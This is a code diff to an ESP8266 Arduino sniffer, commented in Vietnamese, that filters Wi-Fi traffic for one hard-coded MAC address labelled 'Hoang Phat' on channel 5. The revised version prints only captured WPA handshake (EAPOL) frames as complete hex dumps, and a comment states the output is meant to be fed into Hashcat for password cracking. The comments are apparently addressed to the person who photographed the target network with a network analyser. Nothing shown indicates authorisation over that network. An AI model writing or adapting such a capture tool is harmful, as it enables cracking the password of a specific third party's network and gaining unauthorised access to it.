@@ -4,38 +4,35 @@ extern "C" {
   #include "user_interface.h"
 }
 
-// MAC Hoang Phat từ ảnh của bạn
+// MAC Hoang Phat từ ảnh Net Analyzer của bạn
 uint8_t target_mac[6] = {0x20, 0xBE, 0xB4, 0x12, 0x96, 0xE8};
 
 void sniffer_callback(uint8_t *buf, uint16_t len) {
-  // Bỏ qua 12 byte tiêu đề điều khiển để lấy khung hình Wi-Fi thô
   uint8_t *frame = buf + 12;
   uint16_t frame_len = len - 12;
 
-  // Lọc đúng MAC Hoang Phat (Source MAC hoặc BSSID)
+  // 1. Lọc đúng MAC Hoang Phat
   if (memcmp(frame + 10, target_mac, 6) == 0 || memcmp(frame + 16, target_mac, 6) == 0) {
     
-    // Kiểm tra xem có phải Handshake (EAPOL) không
-    bool isEAPOL = (frame[32] == 0x88 && frame[33] == 0x8E) || (frame[34] == 0x88 && frame[35] == 0x8E);
-
-    if (isEAPOL) {
-      Serial.println("\n[!!!] PHÁT HIỆN HANDSHAKE (EAPOL) [!!!]");
+    // 2. CHỈ IN KHI THẤY GÓI TIN HANDSHAKE (EAPOL)
+    // Dấu hiệu nhận biết gói EAPOL: 0x88 0x8E
+    if ((frame[32] == 0x88 && frame[33] == 0x8E) || (frame[34] == 0x88 && frame[35] == 0x8E)) {
+      
+      Serial.println("\n[!!!] ĐÃ TÓM ĐƯỢC HANDSHAKE (EAPOL) [!!!]");
+      Serial.printf("RSSI: %d dBm | Độ dài: %d\n", (signed char)buf[0], frame_len);
+      Serial.print("DATA HEX: ");
+      
+      // Hiện rõ từng số và chữ không thiếu một byte nào để nạp Hashcat
+      for (int i = 0; i < frame_len; i++) {
+        Serial.printf("%02X ", frame[i]);
+      }
+      Serial.println("\n------------------------------------------------");
     }
-
-    // IN RÕ TỪNG SỐ VÀ CHỮ (HEX DUMP) - KHÔNG CẮT NGẮN
-    Serial.printf("RSSI:%d | Len:%d | DATA: ", (signed char)buf[0], frame_len);
-    
-    for (int i = 0; i < frame_len; i++) {
-      Serial.printf("%02X ", frame[i]); // Hiện rõ từng cặp số Hex
-    }
-    
-    Serial.println("\n------------------------------------------------");
   }
 }
 
 void setup() {
-  // Tốc độ 115200 để Serial USB Terminal đọc mượt mà
-  Serial.begin(115200);
+  Serial.begin(115200); // Khớp với Serial USB Terminal và Python của bạn
   
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
@@ -44,14 +41,10 @@ void setup() {
   wifi_set_promiscuous_rx_cb(sniffer_callback);
   wifi_promiscuous_enable(1);
   
-  // Cố định Kênh 5 theo đúng ảnh Net Analyzer
-  wifi_set_channel(5); 
+  wifi_set_channel(5); // Kênh 5 theo ảnh bạn gửi
 
-  Serial.println("\n--- SNIFFER FULL DATA: HOANG PHAT ---");
-  Serial.println("Dữ liệu đang được đổ vào Serial USB Terminal...");
+  Serial.println("\n--- CHẾ ĐỘ RÌNH HANDSHAKE: HOANG PHAT ---");
+  Serial.println("Đang im lặng để chờ gói tin 88 8E...");
 }
 
-void loop() {
-  // Chạy ở xung nhịp cao nhất để không mất gói tin
-  delay(1); 
-}
+void loop() { delay(1); }
